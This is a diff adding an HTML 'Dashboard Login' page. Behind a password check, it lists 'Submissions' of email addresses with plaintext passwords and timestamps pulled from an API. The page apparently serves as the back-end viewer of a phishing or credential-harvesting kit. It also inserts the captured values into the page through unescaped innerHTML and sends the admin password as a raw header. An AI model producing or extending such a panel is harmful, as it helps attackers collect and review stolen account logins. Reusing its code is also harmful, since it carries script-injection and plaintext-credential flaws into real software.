@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Login</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #f8f9fa;
+        }
+        .login-container {
+            margin-top: 100px;
+            max-width: 400px;
+        }
+        .login-card {
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #007bff;
+        }
+        .login-btn {
+            background-color: #007bff;
+            border: none;
+            font-size: 16px;
+            padding: 10px;
+            border-radius: 8px;
+            transition: background-color 0.3s;
+        }
+        .login-btn:hover {
+            background-color: #0056b3;
+        }
+        .error-message {
+            font-size: 14px;
+            color: red;
+            margin-top: 10px;
+        }
+        .table-container {
+            margin-top: 50px;
+        }
+        .table-header {
+            background-color: #343a40;
+            color: white;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container login-container" id="login-container">
+        <div class="card login-card">
+            <h2 class="login-title text-center mb-4">Dashboard Login</h2>
+            <div id="password-form">
+                <div class="input-group mb-3">
+                    <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
+                    <div class="input-group-append">
+                        <button class="btn login-btn" id="submit-password">Login</button>
+                    </div>
+                </div>
+                <p id="error-message" class="error-message"></p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container table-container" style="display:none;" id="data-section">
+        <h2 class="text-center mb-4">Submissions</h2>
+        <table id="submission-table" class="table table-striped table-bordered">
+            <thead class="table-header">
+                <tr>
+                    <th>#</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="submission-data">
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        const passwordForm = document.getElementById('password-form');
+        const loginContainer = document.getElementById('login-container');
+        const dataSection = document.getElementById('data-section');
+        const errorMessage = document.getElementById('error-message');
+
+        document.getElementById('submit-password').onclick = async function() {
+            const enteredPassword = document.getElementById('password').value;
+
+            const response = await fetch('/api/validate-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ password: enteredPassword }),
+            });
+
+            if (response.ok) {
+                loginContainer.style.display = 'none';
+                dataSection.style.display = 'block';
+                fetchData(enteredPassword);
+            } else {
+                errorMessage.textContent = "Invalid password. Please try again.";
+            }
+        };
+
+        async function fetchData(password) {
+            const response = await fetch('/api/submissions', {
+                headers: {
+                    'Authorization': password
+                }
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                const tableBody = document.getElementById('submission-data');
+                tableBody.innerHTML = '';
+                data.forEach(submission => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${submission.index}</td>
+                        <td><code>${submission.email}</code></td>
+                        <td><code>${submission.password}</code></td>
+                        <td>${submission.submitted_at}</td>
+                    `;
+                    tableBody.appendChild(row);
+                });
+            } else {
+                console.error("Unauthorized access or error fetching data");
+            }
+        }
+    </script>
+</body>
+</html>
